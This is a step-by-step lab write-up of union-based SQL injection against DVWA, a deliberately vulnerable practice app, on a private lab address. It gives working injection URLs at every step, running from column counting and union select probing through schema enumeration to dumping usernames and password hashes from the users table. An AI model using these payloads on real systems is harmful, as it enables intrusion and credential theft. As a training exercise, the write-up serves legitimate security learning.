## Union based sql injection report :
---
### Step 1 :

Finding check points : 

```http://172.16.34.128/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#```


![](https://raw.githubusercontent.com/0x48iffy/CSP-Tasks/master/photo/11.png)

### Step 2: 
Generating errors by providing `'` after the id number after analyze it

url : ```http://172.16.34.128/dvwa/vulnerabilities/sqli/?id=1'&Submit=Submit#```

![](https://raw.githubusercontent.com/0x48iffy/CSP-Tasks/master/photo/1.png)

### Step 3:
Finding out the columns which is/are available in the table.

url : ```http://172.16.34.128/dvwa/vulnerabilities/sqli/?id=1' order by 10--+&Submit=Submit#```

Got the error as there '10' column does not exist.

![](https://raw.githubusercontent.com/0x48iffy/CSP-Tasks/master/photo/3.1.png)

-> gradually decreaing the number untill we get some output.

![](https://raw.githubusercontent.com/0x48iffy/CSP-Tasks/master/photo/3.2.png)

### Step 4:
Finding out the vulnable column out of existing by this following payload :

url : ```http://172.16.34.128/dvwa/vulnerabilities/sqli/?id=1'union select 1,2--+&Submit=Submit#```

Following output shows that '1' & '2' both are vulnable column :

![](https://raw.githubusercontent.com/0x48iffy/CSP-Tasks/master/photo/2.png)


### Step 5:
Now, we'll find out the name of the database by replacing any vulnable column with```databasse()```.

payload :

url : ```http://172.16.34.128/dvwa/vulnerabilities/sqli/?id=1'union select 1,database()--+&Submit=Submit#```

![](https://raw.githubusercontent.com/0x48iffy/CSP-Tasks/master/photo/3.png)



### Step 6:
Once we get the name of the database name we can now fetch all the existing tables by using the below payload :

url : ```http://172.16.34.128/dvwa/vulnerabilities/sqli/?id=1'union select 1,table_name from information_schema.tables--+&Submit=Submit#```

![](https://raw.githubusercontent.com/0x48iffy/CSP-Tasks/master/photo/4.png)


### Step 7:
Now we can get the columns of a particular table which may contain sensitive info.

Payload :

url : ```http://172.16.34.128/dvwa/vulnerabilities/sqli/?id=1'union select 1,column_name from information_schema.columns--+&Submit=Submit#```

![](https://raw.githubusercontent.com/0x48iffy/CSP-Tasks/master/photo/5.png)

### Step 8 :
In this setp we can fetch data from any particular column

payload 

url : ```http://172.16.34.128/dvwa/vulnerabilities/sqli/?id=1'union select 1, group_concat(user_id,0x0a,user,0x0a,password) from users --+&Submit=Submit#```

![](https://raw.githubusercontent.com/0x48iffy/CSP-Tasks/master/photo/6.png)

